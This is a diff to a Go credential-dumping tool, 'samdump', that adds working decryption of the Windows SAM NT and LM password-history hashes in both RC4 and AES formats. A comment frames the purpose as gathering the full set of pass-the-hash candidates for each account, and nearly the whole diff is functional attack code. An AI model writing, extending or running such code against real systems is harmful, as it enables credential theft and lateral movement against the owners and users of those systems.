@@ -33,13 +33,16 @@ import (
 // is unknown.
 var ErrUserHash = errors.New("samdump: user hash decrypt failed")
 
-// Hash encryption envelope constants. The two ASCII strings are
+// Hash encryption envelope constants. The four ASCII strings are
 // hard-coded into Microsoft's SAM hash derivation since NT 4.0;
 // every credential dumper (mimikatz, impacket, SharpKatz) reuses
-// them verbatim.
+// them verbatim. The "HISTORY" variants gate the per-user
+// password-history blob (see decryptUserNTHistory).
 var (
-	hashEncNTPassword = []byte("NTPASSWORD\x00")
-	hashEncLMPassword = []byte("LMPASSWORD\x00")
+	hashEncNTPassword        = []byte("NTPASSWORD\x00")
+	hashEncLMPassword        = []byte("LMPASSWORD\x00")
+	hashEncNTPasswordHistory = []byte("NTPASSWORDHISTORY\x00")
+	hashEncLMPasswordHistory = []byte("LMPASSWORDHISTORY\x00")
 )
 
 // SAM_HASH revision tags carried at the start of the per-user hash
@@ -48,6 +51,138 @@ const (
 	hashRevisionLegacy = 0x00010001 // legacy MD5+RC4 path
 	hashRevisionAES    = 0x00010002 // modern SAM_HASH_AES path
 )
+
+// decryptUserNTHistory decrypts the NT password-history blob `enc`
+// of user `rid` using the domain `hashedBootkey`. enc is the raw
+// SAM_HASH (legacy) or SAM_HASH_AES (modern) wrapper carved from the
+// V record; its Data field is N concatenated 16-byte hashes (most
+// recent first). Returns N decrypted hashes (each 16 bytes), or nil
+// + nil when no history is present (empty enc, header-only AES
+// envelope, or PasswordHistorySize=0). nil + error on real failures.
+//
+// Operationally: pair with decryptUserNT to get the FULL set of
+// pass-the-hash candidates for a single account — current NT plus
+// up to 24 historical NT hashes (Windows default
+// `MaximumPasswordHistory=24`).
+func decryptUserNTHistory(hashedBootkey []byte, rid uint32, enc []byte) ([][]byte, error) {
+	return decryptUserHashHistory(hashedBootkey, rid, enc, hashEncNTPasswordHistory)
+}
+
+// decryptUserLMHistory is the LM-history counterpart. The constant
+// differs but every other step is identical. Modern Windows builds
+// (1607+) have LM hashing disabled by default — expect this to
+// return (nil, nil) on every account on a current host.
+func decryptUserLMHistory(hashedBootkey []byte, rid uint32, enc []byte) ([][]byte, error) {
+	return decryptUserHashHistory(hashedBootkey, rid, enc, hashEncLMPasswordHistory)
+}
+
+// decryptUserHashHistory mirrors decryptUserHash but unwraps an
+// N-block payload instead of a single hash. Both wrapper variants
+// (legacy SAM_HASH + modern SAM_HASH_AES) are supported; the bulk
+// stream/block cipher operates over the full Data field in one
+// pass, then the result is split into 16-byte chunks each
+// independently DES-de-permuted with the user's RID-derived keys.
+func decryptUserHashHistory(hashedBootkey []byte, rid uint32, enc, encMarker []byte) ([][]byte, error) {
+	if len(hashedBootkey) != 16 {
+		return nil, fmt.Errorf("%w: hashedBootkey length %d, want 16", ErrUserHash, len(hashedBootkey))
+	}
+	if len(enc) == 0 {
+		return nil, nil
+	}
+	if len(enc) < hashWrapperLen {
+		return nil, fmt.Errorf("%w: history blob shorter than 4-byte SAM_HASH wrapper (%d)",
+			ErrUserHash, len(enc))
+	}
+	revision := binary.LittleEndian.Uint16(enc[hashWrapperOffRevision : hashWrapperOffRevision+2])
+
+	var bulkPlain []byte
+	switch revision {
+	case 0x0002:
+		// SAM_HASH_AES with N×16 Data field. decryptHashHistoryAES
+		// returns the full plaintext block (or nil if header-only).
+		var err error
+		bulkPlain, err = decryptHashHistoryAES(hashedBootkey, enc)
+		if err != nil {
+			return nil, err
+		}
+		if bulkPlain == nil {
+			return nil, nil
+		}
+	case 0x0001:
+		// SAM_HASH (legacy): 4-byte header + N×16 RC4-encrypted bytes.
+		dataLen := len(enc) - hashWrapperLen
+		if dataLen == 0 {
+			return nil, nil
+		}
+		if dataLen%16 != 0 {
+			return nil, fmt.Errorf("%w: legacy history data length %d not aligned to 16-byte blocks",
+				ErrUserHash, dataLen)
+		}
+		rc4Key := deriveLegacyHashKey(hashedBootkey, rid, encMarker)
+		rc, err := rc4.NewCipher(rc4Key)
+		if err != nil {
+			return nil, fmt.Errorf("%w: rc4 NewCipher: %v", ErrUserHash, err)
+		}
+		bulkPlain = make([]byte, dataLen)
+		rc.XORKeyStream(bulkPlain, enc[hashWrapperLen:])
+	default:
+		return nil, fmt.Errorf("%w: unknown SAM_HASH revision 0x%04X (history)", ErrUserHash, revision)
+	}
+
+	// Split into 16-byte intermediate blocks and apply the per-RID
+	// DES de-permutation independently to each — the same final
+	// step used for the current hash.
+	if len(bulkPlain)%16 != 0 {
+		return nil, fmt.Errorf("%w: history plaintext length %d not aligned to 16 bytes",
+			ErrUserHash, len(bulkPlain))
+	}
+	count := len(bulkPlain) / 16
+	out := make([][]byte, 0, count)
+	for i := 0; i < count; i++ {
+		hash, err := desUnwrap(rid, bulkPlain[i*16:(i+1)*16])
+		if err != nil {
+			return nil, fmt.Errorf("history block %d: %w", i, err)
+		}
+		out = append(out, hash)
+	}
+	return out, nil
+}
+
+// decryptHashHistoryAES is the multi-block sibling of decryptHashAES.
+// The envelope layout is identical (PekID/Revision/DataOffset/Salt/
+// Data); the Data field carries N AES-CBC blocks (N × 16 bytes)
+// instead of one. Returns the full plaintext payload (N × 16 bytes)
+// — the caller splits + de-permutes per chunk. Header-only envelopes
+// (no Data) return (nil, nil).
+func decryptHashHistoryAES(hashedBootkey, enc []byte) ([]byte, error) {
+	const (
+		offSalt = 0x08
+		offData = 0x18
+	)
+	if len(enc) <= offData {
+		// Header-only ⇒ no history (PasswordHistorySize=0 or
+		// fresh account). Same convention as decryptHashAES.
+		return nil, nil
+	}
+	if len(enc) < offData+16 {
+		return nil, fmt.Errorf("%w: AES history envelope shorter than %d bytes (%d)",
+			ErrUserHash, offData+16, len(enc))
+	}
+	salt := enc[offSalt : offSalt+16]
+	cipherBytes := enc[offData:]
+	if len(cipherBytes)%aes.BlockSize != 0 {
+		return nil, fmt.Errorf("%w: AES history data length %d not aligned to AES block",
+			ErrUserHash, len(cipherBytes))
+	}
+	block, err := aes.NewCipher(hashedBootkey)
+	if err != nil {
+		return nil, fmt.Errorf("%w: aes NewCipher (history): %v", ErrUserHash, err)
+	}
+	mode := cipher.NewCBCDecrypter(block, salt)
+	plain := make([]byte, len(cipherBytes))
+	mode.CryptBlocks(plain, cipherBytes)
+	return plain, nil
+}
 
 // decryptUserNT decrypts the NT hash blob `enc` of user `rid` using
 // the domain `hashedBootkey`. enc is the raw 16-byte (legacy) or
